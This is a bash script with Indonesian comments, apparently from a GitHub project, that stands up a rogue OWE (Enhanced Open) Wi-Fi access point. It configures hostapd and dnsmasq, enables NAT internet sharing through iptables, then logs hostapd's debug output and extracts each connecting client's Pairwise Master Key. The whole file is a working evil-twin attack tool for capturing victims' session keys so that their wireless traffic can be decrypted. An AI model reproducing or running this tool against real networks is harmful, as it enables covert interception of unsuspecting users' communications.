#!/bin/bash
#
#...............................................................
#
#.......: rogue_owe.sh
#.......: Dibuat oleh: Rofi (Fixploit03)
#.......: GitHub: https://github.com/fixploit03/rogue-owe
#
#...............................................................

set -e

# cek root
if [[ "${EUID}" -ne 0 ]]; then
        echo "ERROR: Script ini harus dijalankan sebagai root!"
        exit 1
fi

# cek jumlah argumen
if [[ "${#}" -ne 3 ]]; then
        echo "Usage: sudo ${0} <interface_ap> <interface_internet> <ssid>"
        exit 1
fi

# konfigurasi
banner="rogue owe"
interface_ap="${1}"
interface_internet="${2}"
ssid="${3}"
ip_address="10.10.10.1/24"
conf_dhcp="dnsmasq.conf"
conf_ap="hostapd.conf"
log="log.txt"

# validasi interface ap
if ! iw dev | awk '{print $2}' | grep -qw "${interface_ap}"; then
        echo "ERROR: Interface '${interface_ap}' tidak ditemukan!"
        exit 1
fi

phy=$(cat /sys/class/net/"${interface_ap}"/phy80211/name)

if ! iw phy "${phy}" info | grep -q "\* AP$"; then
        echo "ERROR: Interface '${interface_ap}' tidak mendukung mode AP!"
        exit 1
fi

# validasi interface internet
if ! ip link show "${interface_internet}" &>/dev/null; then
        echo "ERROR: Interface internet '${interface_internet}' tidak ditemukan!"
        exit 1
fi

if [[ "${interface_ap}" == "${interface_internet}" ]]; then
        echo "ERROR: Interface AP dengan interface internet tidak boleh sama!"
        exit 1
fi

if ! ping -c 1 -W 2 -I "${interface_internet}" 8.8.8.8 &>/dev/null; then
        echo "ERROR: Interface '${interface_internet}' tidak memiliki koneksi internet!"
        exit 1
fi

# validasi ssid
if [[ "${#ssid}" -gt 32 ]]; then
        echo "ERROR: Panjang SSID tidak valid!"
        exit 1
fi

# clean up (CTRL+C)
clean_up(){
        # kill service
        killall -9 hostapd dnsmasq

        # flush ip address
        ip a f dev "${interface_ap}"
        ip l set "${interface_ap}" down
        iw dev "${interface_ap}" set type managed
        ip l set "${interface_ap}" up

        # flush rules ip_tables
        iptables -F
        iptables -t nat -F

        # disable ip forwarding
        echo 0 > /proc/sys/net/ipv4/ip_forward

        # hapus file config
        rm "${conf_ap}" "${conf_dhcp}" "${log}"
}

trap clean_up SIGINT

# menampilkan banner
figlet -f slant "${banner}"
echo ""

# menambahkan ip address pada interface ap
echo "[*] Menambahkan IP Address pada interface '${interface_ap}'..."
ip a f dev "${interface_ap}"
ip a a "${ip_address}" dev "${interface_ap}"
ip l set "${interface_ap}" up

# membuat config dnsmasq
echo "[*] Membuat config dnsmasq..."
cat <<EOF> "${conf_dhcp}"
interface=${interface_ap}
bind-interfaces
dhcp-authoritative
dhcp-range=10.10.10.2,10.10.10.254,255.255.255.0,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,8.8.8.8,8.8.4.4
port=0
EOF

# membuat config hostapd
echo "[*] Membuat config hostapd..."
cat <<EOF> "${conf_ap}"
interface=${interface_ap}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=11
wpa=2
wpa_key_mgmt=OWE
rsn_pairwise=CCMP
ieee80211w=2
EOF

# mengaktifkan ip forwarding
echo "[*] Mengaktifkan IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# mengaktifkan internet sharing
echo "[*] Mengaktifkan internet sharing (NAT)..."
iptables -t nat -A POSTROUTING -o "${interface_internet}" -j MASQUERADE
iptables -A FORWARD -i "${interface_ap}" -o "${interface_internet}" -j ACCEPT
iptables -A FORWARD -i "${interface_internet}" -o "${interface_ap}" -m state --state RELATED,ESTABLISHED -j ACCEPT

# menjalankan service
echo "[*] Menjalankan DHCP Server..."
dnsmasq -C "${conf_dhcp}"
echo "[*] Menjalankan AP..."
hostapd "${conf_ap}" -d -K > "${log}" 2>&1 &

# menunggu client konek
echo "[*] Menunggu client konek..."
tail -F "${log}" | grep -a -w --line-buffered "OWE: PMK - hexdump(len=32)" | while read -r baris; do
        pmk=$(echo "${baris}" | cut -d ' ' -f5- | tr -d ' ')
        echo "[+] PMK = ${pmk}"
done
